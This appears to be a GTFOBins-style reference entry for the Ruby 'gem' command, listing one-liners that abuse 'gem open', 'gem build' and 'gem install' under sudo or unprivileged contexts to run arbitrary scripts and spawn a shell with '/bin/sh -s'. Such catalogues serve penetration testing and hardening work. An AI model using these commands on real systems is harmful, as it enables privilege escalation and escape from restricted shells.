title: gem
html:
gem

Inherit

Context: sudo, unprivileged

gem open debug

Context: sudo, unprivileged

gem build /path/to/script.rb

Context: sudo, unprivileged

gem install --file /path/to/script.rb

Shell

Context: sudo, unprivileged

gem open -e '/bin/sh -s' debug
